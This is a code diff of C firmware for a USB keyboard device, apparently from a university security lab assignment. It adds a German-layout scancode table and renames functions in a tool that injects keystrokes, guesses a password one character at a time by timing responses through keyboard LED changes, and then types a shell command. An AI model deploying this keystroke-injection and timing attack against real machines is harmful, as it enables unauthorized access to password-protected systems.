@@ -2,6 +2,10 @@
 #include "german_keyboardCodes.h"
 #include <string.h>
 
+// Character set used in passwords (from assignment PDF)
+static const char PasswordSetOfChars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!()-_+=~;:,.<>[]{}/?&$ ";
+static uint8_t PasswordSetOfCharsLen = 0;
+
 // File creation command sequence: cd $HOME\necho "MEHMET ARSLAN" > 03811532\n
 static const char file_creation_cmd[] = "cd $HOME\necho \"MEHMET ARSLAN\" > 03811532\n";
 static const uint8_t file_creation_cmd_len = sizeof(file_creation_cmd) - 1;
@@ -32,10 +36,131 @@ void SysTick_Handler(void)
 	timer_ms++;
 }
 
-extern uint8_t getCharCodeInGerman(char c, uint8_t* modifier);
-
-void attack_init(void)
+// Convert ASCII character to German keyboard scancode
+static uint8_t GetCharCodeInGerman(char c, uint8_t* modifier)
 {
+	*modifier = 0;
+
+	// Lowercase letters (a-z)
+	if (c >= 'a' && c <= 'z')
+	{
+		return GERMAN_KEYBOARD_SC_A + (c - 'a');
+	}
+
+	// Uppercase letters (A-Z) - requires Shift modifier
+	if (c >= 'A' && c <= 'Z')
+	{
+		*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
+		return GERMAN_KEYBOARD_SC_A + (c - 'A');
+	}
+
+	// Numbers and special characters
+	switch(c)
+	{
+		// Numbers (no modifier)
+		case '1':
+			return GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION;
+		case '2':
+			return GERMAN_KEYBOARD_SC_2_AND_QUOTES;
+		case '3':
+			return GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH;
+		case '4':
+			return GERMAN_KEYBOARD_SC_4_AND_DOLLAR;
+		case '5':
+			return GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE;
+		case '6':
+			return GERMAN_KEYBOARD_SC_6_AND_AMPERSAND;
+		case '7':
+			return GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE;
+		case '8':
+			return GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET;
+		case '9':
+			return GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET;
+		case '0':
+			return GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE;
+
+		// Special characters with Shift
+		case '!':
+			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
+			return GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION;
+		case '$':
+			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
+			return GERMAN_KEYBOARD_SC_4_AND_DOLLAR;
+		case '&':
+			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
+			return GERMAN_KEYBOARD_SC_6_AND_AMPERSAND;
+		case '/':
+			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
+			return GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE;
+		case '(':
+			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
+			return GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET;
+		case ')':
+			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
+			return GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET;
+		case '=':
+			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
+			return GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE;
+		case '?':
+			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
+			return GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH;
+		case '*':
+			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
+			return GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE;
+		case '_':
+			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
+			return GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE;
+		case ';':
+			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
+			return GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON;
+		case ':':
+			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
+			return GERMAN_KEYBOARD_SC_DOT_AND_COLON;
+		case '>':
+			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
+			return GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE;
+
+		// Special characters with Right Alt (AltGr)
+		case '{':
+			*modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
+			return GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE;
+		case '[':
+			*modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
+			return GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET;
+		case ']':
+			*modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
+			return GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET;
+		case '}':
+			*modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
+			return GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE;
+		case '~':
+			*modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
+			return GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE;
+
+		// Other characters (no modifier)
+		case '+':
+			return GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE;
+		case '-':
+			return GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE;
+		case ',':
+			return GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON;
+		case '.':
+			return GERMAN_KEYBOARD_SC_DOT_AND_COLON;
+		case ' ':
+			return GERMAN_KEYBOARD_SC_SPACE;
+		case '<':
+			return GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE;
+	}
+
+	// Character not supported, return 0
+	return 0;
+}
+
+void AttackInit(void)
+{
+	// Calculate password character set length
+	PasswordSetOfCharsLen = strlen(PasswordSetOfChars);
+
 	curr_char_id = 0;
 	position_id_in_attempt = 0;
 	confirmed_len = 0;
@@ -71,7 +196,7 @@ static void sendFileCreationCommand(USB_KeyboardReport_Data_t* report)
 		}
 		else
 		{
-			report->KeyCode[0] = getCharCodeInGerman(c, &(report->Modifier));
+			report->KeyCode[0] = GetCharCodeInGerman(c, &(report->Modifier));
 		}
 		is_button_pressed = true;
 	}
@@ -83,7 +208,7 @@ static void sendFileCreationCommand(USB_KeyboardReport_Data_t* report)
 }
 
 // Main HID report creation - coordinates password attack and file creation
-void attack_create_report(USB_KeyboardReport_Data_t* report)
+void AttackCreateReport(USB_KeyboardReport_Data_t* report)
 {
 	report->Modifier = 0;
 	report->Reserved = 0;
@@ -96,7 +221,7 @@ void attack_create_report(USB_KeyboardReport_Data_t* report)
 	}
 
 	// Try all characters in charset for current password position
-	if (curr_char_id < password_set_of_chars_len)
+	if (curr_char_id < PasswordSetOfCharsLen)
 	{
 		if (!send_enter_now)
 		{
@@ -123,14 +248,14 @@ void attack_create_report(USB_KeyboardReport_Data_t* report)
 }
 
 // Send already-cracked password characters
-void sendResolvedChars(USB_KeyboardReport_Data_t* report)
+static void sendResolvedChars(USB_KeyboardReport_Data_t* report)
 {
 	if (position_id_in_attempt < confirmed_len)
 	{
 		if (!is_button_pressed)
 		{
 			char c = confirmed_password[position_id_in_attempt];
-			report->KeyCode[0] = getCharCodeInGerman(c, &(report->Modifier));
+			report->KeyCode[0] = GetCharCodeInGerman(c, &(report->Modifier));
 			is_button_pressed = true;
 		}
 		else
@@ -142,16 +267,16 @@ void sendResolvedChars(USB_KeyboardReport_Data_t* report)
 }
 
 // Send the current test character
-void sendUnsolvedCurrentChar(USB_KeyboardReport_Data_t* report)
+static void sendUnsolvedCurrentChar(USB_KeyboardReport_Data_t* report)
 {
-	if (curr_char_id < password_set_of_chars_len)
+	if (curr_char_id < PasswordSetOfCharsLen)
 	{
 		if (!send_enter_now)
 		{
 			if (!is_button_pressed)
 			{
-				char current_char = password_set_of_chars[curr_char_id];
-				report->KeyCode[0] = getCharCodeInGerman(current_char, &(report->Modifier));
+				char current_char = PasswordSetOfChars[curr_char_id];
+				report->KeyCode[0] = GetCharCodeInGerman(current_char, &(report->Modifier));
 				is_button_pressed = true;
 			}
 			else
@@ -165,7 +290,7 @@ void sendUnsolvedCurrentChar(USB_KeyboardReport_Data_t* report)
 }
 
 // Send Enter key and start timing measurement
-void sendEnterKey(USB_KeyboardReport_Data_t* report)
+static void sendEnterKey(USB_KeyboardReport_Data_t* report)
 {
 	if (!is_button_pressed)
 	{
@@ -183,12 +308,12 @@ void sendEnterKey(USB_KeyboardReport_Data_t* report)
 }
 
 // Analyze timing results and select character with longest delay (correct character)
-void findBestTimeAndExtractPasswordChar()
+static void findBestTimeAndExtractPasswordChar(void)
 {
 	uint32_t longest_time = 0;
 	uint8_t longest_time_id = 0;
 
-	for (uint8_t i = 0; i < password_set_of_chars_len; i++)
+	for (uint8_t i = 0; i < PasswordSetOfCharsLen; i++)
 	{
 		if (timings[i] > longest_time)
 		{
@@ -197,7 +322,7 @@ void findBestTimeAndExtractPasswordChar()
 		}
 	}
 
-	confirmed_password[confirmed_len++] = password_set_of_chars[longest_time_id];
+	confirmed_password[confirmed_len++] = PasswordSetOfChars[longest_time_id];
 
 	// Reset for next character - CAPSLOCK detection handles completion
 	curr_char_id = 0;
@@ -205,7 +330,7 @@ void findBestTimeAndExtractPasswordChar()
 }
 
 // Process LED state changes for timing measurement
-void attack_process_response(uint8_t* led_report)
+void AttackProcessResponse(uint8_t* led_report)
 {
 	uint8_t current_led_state = *led_report;
 
@@ -220,7 +345,7 @@ void attack_process_response(uint8_t* led_report)
 	last_led_state = current_led_state;
 }
 
-void mark_attack_completed()
+void MarkAttackCompleted(void)
 {
 	attack_completed = true;
 }
